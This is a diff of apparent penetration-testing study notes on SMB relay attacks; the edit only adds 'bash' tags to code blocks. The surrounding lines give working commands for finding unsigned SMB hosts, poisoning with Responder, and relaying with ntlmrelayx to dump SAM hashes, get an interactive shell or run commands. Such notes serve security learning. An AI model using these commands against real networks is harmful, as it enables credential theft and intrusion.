@@ -11,7 +11,7 @@ How to SMB relay:
 
 1) Identify hosts without SMB Signing
 
-```
+```bash
 nmap --script=smb2-security-mode.nse -p445 <IP_address> -Pn
 ```
 
@@ -21,7 +21,7 @@ We can use -Pn to try probing it if we don't find a host without SMB signing on 
 
 2) Edit  Responder config file:
 
-```
+```bash
 sudo mousepad /etc/responder/Responder.conf
 ```
 
@@ -31,13 +31,13 @@ We need to turn SMB and HTTP off because we need to make sure that the hashes ar
 
 3) Run Responder:
 
-```
+```bash
 sudo responder -I eth0 -dwPv
 ```
 
 4) Set up your relay:
 
-```
+```bash
 sudo ntlmrelayx.py -tf targets.txt -smb2support
 ```
 
@@ -59,7 +59,7 @@ It dumps out the SAM hashes here. We can then crack those hashes to gain access 
 
 7) Other Wins:
 
-```
+```bash
 sudo ntlmrelayx.py -f targets.txt -smb2support -i
 ```
 
@@ -67,7 +67,7 @@ We can also put an -i at the end so that we can get an interactive shell instead
 
 ![[Pasted image 20240827115337.png]]
 
-```
+```bash
 sudo ntlmrelayx.py -f targets.txt -smb2support -c "whoami"
 ```
 
